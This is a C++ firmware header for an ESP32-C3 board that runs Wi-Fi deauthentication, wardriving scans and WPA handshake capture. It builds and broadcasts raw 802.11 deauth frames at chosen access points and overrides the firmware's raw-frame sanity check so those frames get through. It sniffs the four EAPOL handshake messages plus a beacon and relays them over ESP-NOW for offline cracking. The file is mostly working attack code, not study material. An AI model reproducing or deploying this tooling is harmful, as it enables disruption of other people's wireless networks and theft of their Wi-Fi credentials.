/*---------------------------------------------------------------------
  ESP32-C3 Unified (Serial-controlled) — 2.4GHz only
  Modes:
    - DEAUTH : original slave_deauther (scan + optional deauth)
    - WARD   : wardriving passive scan -> ESP-NOW AP info
    - MULTI  : channel-hopping deauth + handshake capture -> ESP-NOW fragments

  Control via USB Serial and UART1 (GPIO6/7) OR Serial USB.

---------------------------------------------------------------------*/

#pragma once

// ─────────────────────────────────────────────
// 1. INCLUDES
// ─────────────────────────────────────────────
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <esp_wifi_types.h>
#include <stdarg.h>
#include <Preferences.h>


// ─────────────────────────────────────────────
// 2. HARDWARE DEFINES & LED
// ─────────────────────────────────────────────
int RX_PIN = 6;
int TX_PIN = 7;

#define LED_PIN 8

static bool ledEnabled = true;


// ─────────────────────────────────────────────
// 3. SERIAL FRAMED COMMAND STRUCT
// ─────────────────────────────────────────────
struct CmdFrame {
  bool    framed  = false;
  String  type;
  uint8_t seq     = 0;
  String  payload;
};


// ─────────────────────────────────────────────
// 4. ESP-NOW STRUCTS & CONSTANTS
// ─────────────────────────────────────────────

/* AP payload for wardriving */
typedef struct __attribute__((packed)) {
  char    bssid[64];
  char    ssid[32];
  char    encryptionType[16];
  int32_t channel;
  int32_t rssi;
  int     boardID;
} struct_message;

// Fragmented frame types (MULTI mode)
#define MAX_FRAME_SIZE      2346
#define ESPNOW_MAX_DATA_LEN 250
#define MAX_FRAGMENT_SIZE   (ESPNOW_MAX_DATA_LEN - 5)
#define FRAGMENT_QUEUE_SIZE 20

typedef struct {
  uint16_t frame_len;
  uint8_t  fragment_number;
  bool     last_fragment;
  uint8_t  boardID;
  uint8_t  frame[MAX_FRAGMENT_SIZE];
} wifi_frame_fragment_t;

typedef struct {
  uint8_t data[ESPNOW_MAX_DATA_LEN];
  size_t  len;
} fragment_queue_item_t;


// ─────────────────────────────────────────────
// 5. GLOBAL VARIABLES
// ─────────────────────────────────────────────

// --- Serial routing ---
HardwareSerial SerialUART(1);
static String serialLineUsb, serialLineUart;
static Preferences prefs;

// --- Feature flags ---
static bool wardEnabled     = false;  // Wardriving (disables deauth+sniff when ON)
static bool scanRunning     = true;
static bool deauthEnabled   = true;
static bool sniffEnabled    = true;         // Promiscuous capture after deauth
static bool sniffSendEspNowEnabled = true;   // Send captured frames via ESP-NOW
static bool manualScanPending = false;

// --- Timing ---
static unsigned long scanInterval    = 1;
static unsigned long historyReset    = 1;
static unsigned long wardHistoryReset = 30000;
static unsigned long sniffTimeoutMs  = 1500;
static unsigned long t_lastScan      = 0;
static unsigned long t_lastClear     = 0;
static unsigned long t_lastClearWard = 0;

// --- Channel management (2.4GHz only) ---
static const uint8_t channelList2g[] = {
  1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13
};

static const size_t MAX_CHANNELS = 64;
static uint8_t  activeChannels[MAX_CHANNELS];
static size_t   activeChannelCount = 0;
static size_t   channelIndex       = 0;

// --- AP scan results ---
static const size_t MAX_APS = 60;

struct ApInfo {
  char          ssid[33];  // kMaxSsidLen + 1
  uint8_t       bssid[6];
  int32_t       rssi;
  uint8_t       channel;
  wifi_auth_mode_t auth;
};
static const size_t kMaxSsidLen = 32;

static ApInfo lastScan[MAX_APS];
static size_t lastScanCount = 0;
static unsigned long lastScanMs = 0;

static ApInfo refScan[MAX_APS];
static size_t refScanCount = 0;
static unsigned long refScanMs = 0;

// --- Target filtering ---
static const size_t MAX_TARGET_SSIDS  = 8;
static const size_t MAX_TARGET_BSSIDS = 16;

static bool   targetSSIDSet   = false;
static bool   targetBSSIDSet  = false;
static String targetSSIDs[MAX_TARGET_SSIDS];
static size_t targetSSIDCount = 0;
static uint8_t targetBSSID[6];
static uint8_t targetBSSIDList[MAX_TARGET_BSSIDS][6];
static size_t  targetBSSIDCount = 0;

// --- MAC history (wardriving dedup) ---
#define MAC_HISTORY_LEN 100
struct mac_addr { uint8_t b[6]; };
static mac_addr  mac_history[MAC_HISTORY_LEN];
static uint8_t   mac_cursor = 0;

// --- MAC history (deauth dedup) ---
#define MAC_HISTORY_LEN_DEAUTH 1
struct mac_addr_deauth { uint8_t b[6]; };
static mac_addr_deauth mac_history_deauth[MAC_HISTORY_LEN_DEAUTH];
static uint8_t         mac_cursor_deauth = 0;

// --- ESP-NOW generic ---
static uint8_t espNowPeerMac[6]   = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
static uint8_t espNowChannel      = 1;
static bool    espNowReady        = false;
static bool    espNowInited       = false;
static const uint8_t kEspNowTxChannel = 1; // Always TX on ch1 (2.4 GHz)
esp_now_peer_info_t peerInfo = {};

// --- MULTI mode: channel hopping (2.4GHz only) ---
static uint8_t channelsToHop[] = {
  1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13
};
static size_t  NUM_HOP_CHANNELS  = sizeof(channelsToHop) / sizeof(channelsToHop[0]);
static size_t  currentHopIndex   = 0;
static uint8_t broadcastAddress[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
static uint8_t BOARD_ID           = 1;

// --- MULTI mode: fragment queue ---
static fragment_queue_item_t fragmentQueue[FRAGMENT_QUEUE_SIZE];
static int  fragmentQueueStart      = 0;
static int  fragmentQueueEnd        = 0;
static bool isSending               = false;
static bool waitingForSendCompletion = false;

// --- MULTI mode: handshake capture state ---
static bool    firstEAPOLCaptured  = false;
static bool    beaconCaptured      = false;
static bool    allFramesCollected  = false;
static uint8_t apBSSID[6];
static uint8_t eapolFrames[4][MAX_FRAME_SIZE];
static int     eapolFrameLengths[4];
static int     eapolFramesCaptured = 0;
static uint8_t beaconFrame[MAX_FRAME_SIZE];
static int     beaconFrameLength   = 0;


// ─────────────────────────────────────────────
// 5b. PERSISTENT STATE (NVS)
// ─────────────────────────────────────────────
static void saveState();
static void loadState();
static void resetState();
static void resetActiveChannels();

static void saveState() {
  if (!prefs.begin("slaveState", false)) {
    outPrintln("ERR: NVS open failed (write)");
    return;
  }
  // Feature flags
  prefs.putBool("wardEn", wardEnabled);
  prefs.putBool("scanRun", scanRunning);
  prefs.putBool("deauthEn", deauthEnabled);
  prefs.putBool("sniffEn", sniffEnabled);
  prefs.putBool("sniffSendEn", sniffSendEspNowEnabled);
  prefs.putBool("ledEn", ledEnabled);
  // Timings
  prefs.putULong("scanIntv", scanInterval);
  prefs.putULong("sniffTout", sniffTimeoutMs);
  prefs.putULong("wardHistRst", wardHistoryReset);
  prefs.putULong("histRst", historyReset);
  // Channels
  prefs.putULong("actChanCnt", (uint32_t)activeChannelCount);
  prefs.putBytes("actChans", activeChannels, activeChannelCount);
  // Target SSIDs
  prefs.putBool("tgtSsidSet", targetSSIDSet);
  prefs.putUChar("tgtSsidCnt", (uint8_t)targetSSIDCount);
  if (targetSSIDCount > 0) {
    uint8_t buf[MAX_TARGET_SSIDS * (kMaxSsidLen + 1)];
    size_t pos = 0;
    for (size_t i = 0; i < targetSSIDCount; ++i) {
      size_t len = targetSSIDs[i].length();
      if (len > kMaxSsidLen) len = kMaxSsidLen;
      memcpy(buf + pos, targetSSIDs[i].c_str(), len);
      pos += len;
      buf[pos++] = '\0';
    }
    prefs.putBytes("tgtSsids", buf, pos);
  } else {
    prefs.remove("tgtSsids");
  }
  // Target BSSIDs
  prefs.putBool("tgtBssidSet", targetBSSIDSet);
  prefs.putBytes("tgtBssid", targetBSSID, 6);
  prefs.putUChar("tgtBssidCnt", (uint8_t)targetBSSIDCount);
  if (targetBSSIDCount > 0) {
    prefs.putBytes("tgtBssidLst", (const uint8_t *)targetBSSIDList, targetBSSIDCount * 6);
  } else {
    prefs.remove("tgtBssidLst");
  }
  prefs.end();
}

static void loadState() {
  if (!prefs.begin("slaveState", true)) {
    // First boot or NVS empty — use compiled defaults
    resetActiveChannels();
    return;
  }
  // Feature flags
  wardEnabled            = prefs.getBool("wardEn", false);
  scanRunning            = prefs.getBool("scanRun", true);
  deauthEnabled          = prefs.getBool("deauthEn", true);
  sniffEnabled           = prefs.getBool("sniffEn", true);
  sniffSendEspNowEnabled = prefs.getBool("sniffSendEn", true);
  ledEnabled             = prefs.getBool("ledEn", true);
  // Timings
  scanInterval     = prefs.getULong("scanIntv", 1);
  sniffTimeoutMs   = prefs.getULong("sniffTout", 1500);
  wardHistoryReset = prefs.getULong("wardHistRst", 30000);
  historyReset     = prefs.getULong("histRst", 1);
  // Channels
  activeChannelCount = (size_t)prefs.getULong("actChanCnt", 0);
  if (activeChannelCount > MAX_CHANNELS) activeChannelCount = MAX_CHANNELS;
  if (activeChannelCount > 0) {
    size_t read = prefs.getBytes("actChans", activeChannels, activeChannelCount);
    if (read != activeChannelCount) activeChannelCount = 0;
  }
  if (activeChannelCount == 0) {
    prefs.end();
    resetActiveChannels();
    prefs.begin("slaveState", true);
  }
  channelIndex = 0;
  // Target SSIDs
  targetSSIDSet   = prefs.getBool("tgtSsidSet", false);
  targetSSIDCount = prefs.getUChar("tgtSsidCnt", 0);
  if (targetSSIDCount > MAX_TARGET_SSIDS) targetSSIDCount = MAX_TARGET_SSIDS;
  if (targetSSIDCount > 0) {
    uint8_t buf[MAX_TARGET_SSIDS * (kMaxSsidLen + 1)];
    size_t blobLen = prefs.getBytes("tgtSsids", buf, sizeof(buf));
    size_t idx = 0;
    for (size_t i = 0; i < targetSSIDCount && idx < blobLen; ++i) {
      const char *start = (const char *)(buf + idx);
      size_t slen = strnlen(start, blobLen - idx);
      targetSSIDs[i] = String(start);
      idx += slen + 1;
    }
  } else {
    targetSSIDSet = false;
  }
  // Target BSSIDs
  targetBSSIDSet   = prefs.getBool("tgtBssidSet", false);
  prefs.getBytes("tgtBssid", targetBSSID, 6);
  targetBSSIDCount = prefs.getUChar("tgtBssidCnt", 0);
  if (targetBSSIDCount > MAX_TARGET_BSSIDS) targetBSSIDCount = MAX_TARGET_BSSIDS;
  if (targetBSSIDCount > 0) {
    size_t read = prefs.getBytes("tgtBssidLst", (uint8_t *)targetBSSIDList, targetBSSIDCount * 6);
    if (read != targetBSSIDCount * 6) targetBSSIDCount = 0;
  }
  prefs.end();
}

static void resetState() {
  if (prefs.begin("slaveState", false)) {
    prefs.clear();
    prefs.end();
  }
  // Reset all RAM to compiled defaults
  wardEnabled            = false;
  scanRunning            = true;
  deauthEnabled          = true;
  sniffEnabled           = true;
  sniffSendEspNowEnabled = true;
  ledEnabled             = true;
  scanInterval           = 1;
  sniffTimeoutMs         = 1500;
  wardHistoryReset       = 30000;
  historyReset           = 1;
  targetSSIDSet          = false;
  targetBSSIDSet         = false;
  targetSSIDCount        = 0;
  targetBSSIDCount       = 0;
  memset(targetBSSID, 0, 6);
  resetActiveChannels();
}


// ─────────────────────────────────────────────
// 6. FORWARD DECLARATIONS
// ─────────────────────────────────────────────
static void maybeSniffHandshakeAfterDeauth(bool didDeauth, uint8_t ch);
static void sendEvt(const CmdFrame &cmd, const String &type, const String &payload);
static void sendListFramed(const CmdFrame &cmd);
static void sendNextFragment();


// ─────────────────────────────────────────────
// 7. LED HELPERS (simple LED on GPIO 8, inverted logic)
// ─────────────────────────────────────────────
inline void setLed(bool on) {
  if (!ledEnabled) return;
  digitalWrite(LED_PIN, on ? LOW : HIGH);  // LOW = allume
}
inline void flashLed() {
  if (!ledEnabled) return;
  setLed(true);
  delay(10);
  setLed(false);
}


// ─────────────────────────────────────────────
// 8. SERIAL ROUTING
// ─────────────────────────────────────────────
static void outPrint(const String &v)        { Serial.print(v);   SerialUART.print(v);   }
static void outPrint(const char *v)          { Serial.print(v);   SerialUART.print(v);   }
static void outPrint(char v)                 { Serial.print(v);   SerialUART.print(v);   }
static void outPrint(int v)                  { Serial.print(v);   SerialUART.print(v);   }
static void outPrint(unsigned int v)         { Serial.print(v);   SerialUART.print(v);   }
static void outPrint(long v)                 { Serial.print(v);   SerialUART.print(v);   }
static void outPrint(unsigned long v)        { Serial.print(v);   SerialUART.print(v);   }
static void outPrintln()                     { Serial.println();  SerialUART.println();  }
static void outPrintln(const String &v)      { Serial.println(v); SerialUART.println(v); }
static void outPrintln(const char *v)        { Serial.println(v); SerialUART.println(v); }
static void outPrintln(int v)                { Serial.println(v); SerialUART.println(v); }
static void outPrintln(unsigned int v)       { Serial.println(v); SerialUART.println(v); }
static void outPrintln(long v)               { Serial.println(v); SerialUART.println(v); }
static void outPrintln(unsigned long v)      { Serial.println(v); SerialUART.println(v); }

static void outPrintf(const char *fmt, ...) {
  char buf[256];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  outPrint(buf);
}


// ─────────────────────────────────────────────
// 9. UTILITY / MISC HELPERS
// ─────────────────────────────────────────────
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t) {
  return (arg == 31337) ? 1 : 0;
}

static bool parseMac(const String &s, uint8_t out[6]) {
  int v[6];
  if (sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x",
             &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
  return true;
}

static const char *security_to_string(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN:           return "OPEN";
    case WIFI_AUTH_WEP:            return "WEP";
    case WIFI_AUTH_WPA_PSK:        return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:       return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:   return "WPA/WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:return "WPA2_ENTERPRISE";
    case WIFI_AUTH_WPA3_PSK:       return "WPA3_PSK";
    default:                       return "UNKNOWN";
  }
}

static String authToShortString(wifi_auth_mode_t m) {
  switch (m) {
    case WIFI_AUTH_OPEN:           return "Open";
    case WIFI_AUTH_WEP:            return "WEP";
    case WIFI_AUTH_WPA_PSK:        return "WPA";
    case WIFI_AUTH_WPA2_PSK:       return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:   return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE:return "WPA2Ent";
    case WIFI_AUTH_WPA3_PSK:       return "WPA3";
    default:                       return "Unknown";
  }
}

static bool mac_cmp(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}


// ─────────────────────────────────────────────
// 10. MAC HISTORY  (wardriving dedup)
// ─────────────────────────────────────────────
static void save_mac(const uint8_t *mac) {
  memcpy(mac_history[mac_cursor].b, mac, 6);
  mac_cursor = (mac_cursor + 1) % MAC_HISTORY_LEN;
}
static bool already_seen(const uint8_t *mac) {
  for (uint8_t i = 0; i < MAC_HISTORY_LEN; ++i)
    if (!memcmp(mac_history[i].b, mac, 6)) return true;
  return false;
}
static void clear_mac_history() {
  memset(mac_history, 0, sizeof(mac_history));
  mac_cursor = 0;
}

// --- MAC history (deauth dedup) ---
static void save_mac_deauth(const uint8_t *mac) {
  memcpy(mac_history_deauth[mac_cursor_deauth].b, mac, 6);
  mac_cursor_deauth = (mac_cursor_deauth + 1) % MAC_HISTORY_LEN_DEAUTH;
}
static bool already_seen_deauth(const uint8_t *mac) {
  for (uint8_t i = 0; i < MAC_HISTORY_LEN_DEAUTH; ++i)
    if (!memcmp(mac, mac_history_deauth[i].b, 6)) return true;
  return false;
}
static void clear_mac_history_deauth() {
  memset(mac_history_deauth, 0, sizeof(mac_history_deauth));
  mac_cursor_deauth = 0;
}


// ─────────────────────────────────────────────
// 11. CHANNEL MANAGEMENT (2.4GHz only)
// ─────────────────────────────────────────────
static bool isAllowed2g(uint8_t ch) {
  for (size_t i = 0; i < sizeof(channelList2g); ++i)
    if (channelList2g[i] == ch) return true;
  return false;
}
static bool isAllowedChannel(uint8_t ch) {
  return isAllowed2g(ch);
}
static bool channelInActive(uint8_t ch) {
  for (size_t i = 0; i < activeChannelCount; ++i)
    if (activeChannels[i] == ch) return true;
  return false;
}
static void addActiveChannel(uint8_t ch) {
  if (activeChannelCount >= MAX_CHANNELS) return;
  if (!isAllowedChannel(ch)) return;
  if (!channelInActive(ch)) activeChannels[activeChannelCount++] = ch;
}
static void resetActiveChannels() {
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < sizeof(channelList2g) && activeChannelCount < MAX_CHANNELS; ++i)
    activeChannels[activeChannelCount++] = channelList2g[i];
}
static void addChannelsFromList(const String &list, bool replaceAll) {
  if (replaceAll) { activeChannelCount = 0; channelIndex = 0; }
  String tmp = list;
  tmp.replace(" ", "");
  while (tmp.length() > 0) {
    int    comma = tmp.indexOf(',');
    String tok   = (comma >= 0) ? tmp.substring(0, comma) : tmp;
    tmp = (comma >= 0) ? tmp.substring(comma + 1) : "";
    int dash = tok.indexOf('-');
    int start = 0, end = 0;
    if (dash >= 0) {
      start = tok.substring(0, dash).toInt();
      end   = tok.substring(dash + 1).toInt();
    } else {
      start = end = tok.toInt();
    }
    if (start <= 0 || end <= 0) continue;
    if (end < start) { int t = start; start = end; end = t; }
    for (int ch = start; ch <= end; ++ch) addActiveChannel((uint8_t)ch);
  }
  if (activeChannelCount == 0) resetActiveChannels();
}


// ─────────────────────────────────────────────
// 12. TARGET FILTERING
// ─────────────────────────────────────────────
static bool targetMatch(const String &ssid, const uint8_t *bssid) {
  if (targetBSSIDCount > 0) {
    for (size_t i = 0; i < targetBSSIDCount; ++i)
      if (!memcmp(bssid, targetBSSIDList[i], 6)) return true;
    return false;
  }
  if (targetSSIDSet) {
    bool ok = false;
    for (size_t i = 0; i < targetSSIDCount; ++i)
      if (ssid == targetSSIDs[i]) { ok = true; break; }
    if (!ok) return false;
  }
  if (targetBSSIDSet && memcmp(bssid, targetBSSID, 6) != 0) return false;
  return true;
}

static void setTargetSsidsFromCsv(const String &csv) {
  targetSSIDCount = 0;
  String tmp = csv;
  while (tmp.length() > 0 && targetSSIDCount < MAX_TARGET_SSIDS) {
    int    comma = tmp.indexOf(',');
    String tok   = (comma >= 0) ? tmp.substring(0, comma) : tmp;
    tmp = (comma >= 0) ? tmp.substring(comma + 1) : "";
    tok.trim();
    if (tok.length() == 0) continue;
    targetSSIDs[targetSSIDCount++] = tok;
  }
  targetSSIDSet = (targetSSIDCount > 0);
}

static void setChannelsFromRefScanForSsidList() {
  if (refScanCount == 0 || !targetSSIDSet || targetSSIDCount == 0) return;
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < refScanCount; ++i)
    for (size_t s = 0; s < targetSSIDCount; ++s)
      if (targetSSIDs[s] == refScan[i].ssid) { addActiveChannel(refScan[i].channel); break; }
}

static void setChannelsFromRefScanForSsid(const String &ssid) {
  if (refScanCount == 0) return;
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < refScanCount; ++i)
    if (ssid == refScan[i].ssid) addActiveChannel(refScan[i].channel);
}

static void setChannelsFromRefScanForBssid(const uint8_t *bssid) {
  if (refScanCount == 0) return;
  activeChannelCount = 0;
  channelIndex = 0;
  for (size_t i = 0; i < refScanCount; ++i)
    if (!memcmp(refScan[i].bssid, bssid, 6)) addActiveChannel(refScan[i].channel);
}


// ─────────────────────────────────────────────
// 13. ESP-NOW  (generic / wardriving)
// ─────────────────────────────────────────────
static bool ensureEspNow() {
  if (espNowReady) return true;
  esp_wifi_set_channel(kEspNowTxChannel, WIFI_SECOND_CHAN_NONE);
  if (!espNowInited) {
    if (esp_now_init() != ESP_OK) {
      outPrintln("ERR|ESPNOW_INIT|0|code=INIT_FAIL|msg=esp_now_init_failed");
      return false;
    }
    espNowInited = true;
  }
  memset(&peerInfo, 0, sizeof(peerInfo));
  memcpy(peerInfo.peer_addr, espNowPeerMac, 6);
  peerInfo.channel = 0;
  peerInfo.encrypt = false;
  esp_err_t addRes = esp_now_add_peer(&peerInfo);
  if (addRes != ESP_OK) {
    if (esp_now_is_peer_exist(espNowPeerMac)) esp_now_del_peer(espNowPeerMac);
    peerInfo.ifidx = WIFI_IF_STA;
    addRes = esp_now_add_peer(&peerInfo);
    if (addRes != ESP_OK) {
      outPrintln("ERR|ESPNOW_INIT|0|code=ADD_PEER_FAIL|msg=esp_now_add_peer_failed");
      return false;
    }
  }
  espNowReady = true;
  return true;
}

static void sendEspNowAp(const struct_message &msg, uint8_t scanCh) {
  if (!ensureEspNow()) return;
  // Always TX on ch1 (2.4 GHz), then restore scan channel.
  esp_wifi_set_channel(kEspNowTxChannel, WIFI_SECOND_CHAN_NONE);
  esp_now_send(espNowPeerMac, (const uint8_t *)&msg, sizeof(msg));
  delay(1);
  esp_wifi_set_channel(scanCh, WIFI_SECOND_CHAN_NONE);
}

static void resetEspNow() {
  if (espNowInited) { esp_now_deinit(); espNowInited = false; }
  espNowReady = false;
}


// ─────────────────────────────────────────────
// 14. MULTI MODE: FRAGMENT QUEUE & ESP-NOW TX
// ─────────────────────────────────────────────
static void resetCaptureState() {
  firstEAPOLCaptured  = false;
  beaconCaptured      = false;
  allFramesCollected  = false;
  eapolFramesCaptured = 0;
  memset(apBSSID,         0, sizeof(apBSSID));
  memset(eapolFrames,     0, sizeof(eapolFrames));
  memset(eapolFrameLengths, 0, sizeof(eapolFrameLengths));
  memset(beaconFrame,     0, sizeof(beaconFrame));
  beaconFrameLength        = 0;
  fragmentQueueStart = fragmentQueueEnd = 0;
  isSending = false;
}

static void enqueueFragment(const uint8_t *data, size_t len) {
  if (len == 0 || len > ESPNOW_MAX_DATA_LEN) return;
  int next = (fragmentQueueEnd + 1) % FRAGMENT_QUEUE_SIZE;
  if (next == fragmentQueueStart) return;
  memcpy(fragmentQueue[fragmentQueueEnd].data, data, len);
  fragmentQueue[fragmentQueueEnd].len = len;
  fragmentQueueEnd = next;
}

static void sendNextFragment() {
  // Always TX ESP-NOW on ch1 (2.4 GHz).
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  while (fragmentQueueStart != fragmentQueueEnd) {
    size_t len = fragmentQueue[fragmentQueueStart].len;
    if (len == 0 || len > ESPNOW_MAX_DATA_LEN) {
      fragmentQueueStart = (fragmentQueueStart + 1) % FRAGMENT_QUEUE_SIZE;
      continue;
    }
    isSending = true;
    esp_err_t res = esp_now_send(broadcastAddress, fragmentQueue[fragmentQueueStart].data, len);
    if (res == ESP_OK) return;
    outPrintf("esp_now_send error %s (%d)\n", esp_err_to_name(res), res);
    fragmentQueueStart = (fragmentQueueStart + 1) % FRAGMENT_QUEUE_SIZE;
  }
  isSending = false;
}

static void onDataSent(const wifi_tx_info_t *, esp_now_send_status_t status) {
  fragmentQueueStart = (fragmentQueueStart + 1) % FRAGMENT_QUEUE_SIZE;
  if (fragmentQueueStart == fragmentQueueEnd) {
    isSending = false;
    waitingForSendCompletion = false;
    esp_wifi_set_promiscuous(false);
    resetCaptureState();
    // Restore scan channel after TX.
    uint8_t restoreCh = channelsToHop[currentHopIndex];
    esp_wifi_set_channel(restoreCh, WIFI_SECOND_CHAN_NONE);
    setLed(true);
  } else {
    sendNextFragment();
  }
}

static void pushFragment(uint8_t frag, bool last, uint8_t boardID,
                         const uint8_t *payload, uint16_t plen) {
  if (plen == 0 || plen > MAX_FRAGMENT_SIZE) return;
  uint8_t  buf[ESPNOW_MAX_DATA_LEN];
  uint8_t *p = buf;
  *(uint16_t *)p = plen; p += 2;
  *p++ = frag;
  *p++ = (uint8_t)last;
  *p++ = boardID;
  memcpy(p, payload, plen);
  enqueueFragment(buf, 5 + plen);
}

static void queueFrameFragments(const uint8_t *data, uint16_t len, uint8_t boardID) {
  uint16_t sent = 0;
  uint8_t  f    = 0;
  while (sent < len) {
    uint16_t chunk = min<uint16_t>(MAX_FRAGMENT_SIZE, len - sent);
    bool     last  = (sent + chunk >= len);
    pushFragment(f++, last, boardID, data + sent, chunk);
    sent += chunk;
  }
}


// ─────────────────────────────────────────────
// 15. MULTI MODE: PROMISCUOUS / EAPOL SNIFFER
// ─────────────────────────────────────────────
static void extractBSSID(const uint8_t *pl, uint16_t fc, uint8_t *bssid) {
  uint8_t type   = (fc & 0x000C) >> 2;
  uint8_t toDS   = (fc & 0x0100) >> 8;
  uint8_t fromDS = (fc & 0x0200) >> 9;
  if (type == 0) {
    memcpy(bssid, pl + 16, 6);
  } else if (type == 2) {
    if      (!toDS && !fromDS) memcpy(bssid, pl + 16, 6);
    else if ( toDS && !fromDS) memcpy(bssid, pl + 4,  6);
    else if (!toDS &&  fromDS) memcpy(bssid, pl + 10, 6);
    else                       memset(bssid, 0, 6);
  } else {
    memset(bssid, 0, 6);
  }
}

static bool isBeacon(const wifi_promiscuous_pkt_t *pkt) {
  const uint8_t *pl  = pkt->payload;
  int            len = pkt->rx_ctrl.sig_len;
  if (len < 24) return false;
  uint16_t fc      = (pl[1] << 8) | pl[0];
  uint8_t  type    = (fc & 0x000C) >> 2;
  uint8_t  subtype = (fc & 0x00F0) >> 4;
  return (type == 0 && subtype == 8);
}

static bool isEAPOL(const wifi_promiscuous_pkt_t *pkt) {
  const uint8_t *pl  = pkt->payload;
  int            len = pkt->rx_ctrl.sig_len;
  if (len < 38) return false;
  uint16_t fc      = (pl[1] << 8) | pl[0];
  uint8_t  type    = (fc & 0x000C) >> 2;
  if (type != 2) return false;
  uint8_t subtype  = (fc & 0x00F0) >> 4;
  bool    hasQoS   = subtype & 0x08;
  int     hdr      = 24 + (hasQoS ? 2 : 0);
  return pl[hdr]   == 0xAA && pl[hdr+1] == 0xAA && pl[hdr+2] == 0x03
      && pl[hdr+6] == 0x88 && pl[hdr+7] == 0x8E;
}

static int getEAPOLMessageNumber(const uint8_t *pl, int len) {
  if (len < 60) return -1;
  uint16_t fc      = (pl[1] << 8) | pl[0];
  bool     hasQoS  = (fc & 0x0080);
  int      hdr_len = 24 + (hasQoS ? 2 : 0);
  int      eapol   = hdr_len + 8;
  if (len < eapol + 6) return -1;
  const uint8_t *ep        = pl + eapol;
  uint16_t       key_info  = (ep[5] << 8) | ep[6];
  bool install = key_info & (1 << 6);
  bool ack     = key_info & (1 << 7);
  bool mic     = key_info & (1 << 8);
  bool secure  = key_info & (1 << 9);
  if (!mic &&  ack && !install && !secure) return 1;
  if ( mic && !ack && !install && !secure) return 2;
  if ( mic &&  ack &&  install &&  secure) return 3;
  if ( mic && !ack && !install &&  secure) return 4;
  return -1;
}

static bool allEAPOLCaptured() {
  for (int i = 0; i < 4; ++i)
    if (eapolFrameLengths[i] == 0) return false;
  return true;
}

static void wifi_sniffer_packet_handler(void *buf, wifi_promiscuous_pkt_type_t) {
  if (allFramesCollected) return;
  auto          *pkt  = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *pl   = pkt->payload;
  int            len  = pkt->rx_ctrl.sig_len;
  uint16_t       fc   = (pl[1] << 8) | pl[0];
  uint8_t        bssid[6];
  extractBSSID(pl, fc, bssid);

  if (isEAPOL(pkt)) {
    int msgNum = getEAPOLMessageNumber(pl, len);
    if (msgNum < 1 || msgNum > 4) return;
    if (!firstEAPOLCaptured) { memcpy(apBSSID, bssid, 6); firstEAPOLCaptured = true; }
    if (mac_cmp(apBSSID, bssid) && eapolFrameLengths[msgNum - 1] == 0) {
      memcpy(eapolFrames[msgNum - 1], pl, len);
      eapolFrameLengths[msgNum - 1] = len;
      eapolFramesCaptured++;
    }
  } else if (isBeacon(pkt) && firstEAPOLCaptured
             && mac_cmp(apBSSID, bssid) && !beaconCaptured) {
    int realLen = len - 4;
    memcpy(beaconFrame, pl, realLen);
    beaconFrameLength = realLen;
    beaconCaptured    = true;
  }

  if (firstEAPOLCaptured && allEAPOLCaptured() && beaconCaptured && !allFramesCollected) {
    allFramesCollected = true;
    outPrintln("=== 4 EAPOL + 1 Beacon -> preparation envoi ESP-NOW ===");

    if (!sniffSendEspNowEnabled) {
      outPrintln("=== ESP-NOW send disabled ===");
      esp_wifi_set_promiscuous(false);
      resetCaptureState();
      setLed(true);
      return;
    }

    fragmentQueueStart = fragmentQueueEnd = 0;
    isSending = false;
    esp_now_deinit();
    esp_now_init();
    esp_now_register_send_cb(onDataSent);
    if (esp_now_is_peer_exist(broadcastAddress)) esp_now_del_peer(broadcastAddress);
    esp_now_peer_info_t pi = {};
    memcpy(pi.peer_addr, broadcastAddress, 6);
    pi.channel = 0;
    pi.encrypt = false;
    pi.ifidx   = WIFI_IF_STA;
    esp_now_add_peer(&pi);

    uint8_t actualChan = WiFi.channel();
    // 2.4GHz only channel list for BOARD_ID mapping.
    static const uint8_t channelsAll[] = {
      1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13
    };
    BOARD_ID = 0;
    for (size_t i = 0; i < sizeof(channelsAll); ++i)
      if (channelsAll[i] == actualChan) { BOARD_ID = i + 1; break; }

    queueFrameFragments(beaconFrame, beaconFrameLength, BOARD_ID);
    for (int i = 0; i < 4; ++i)
      queueFrameFragments(eapolFrames[i], eapolFrameLengths[i], BOARD_ID);
    waitingForSendCompletion = true;
    sendNextFragment();
  }
}


// ─────────────────────────────────────────────
// 16. DEAUTH PACKET
// ─────────────────────────────────────────────
static void sendDeauthPacket(const uint8_t *bssid, uint8_t ch) {
  static const uint8_t tpl[26] PROGMEM = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0, 0, 0, 0, 0, 0,
    0, 0, 0, 0, 0, 0,
    0x00, 0x00, 0x07, 0x00
  };
  uint8_t pkt[26];
  memcpy_P(pkt, tpl, 26);
  memcpy(&pkt[10], bssid, 6);
  memcpy(&pkt[16], bssid, 6);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  for (uint8_t i = 0; i < 10; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    delay(5);
  }
  flashLed();
}


// ─────────────────────────────────────────────
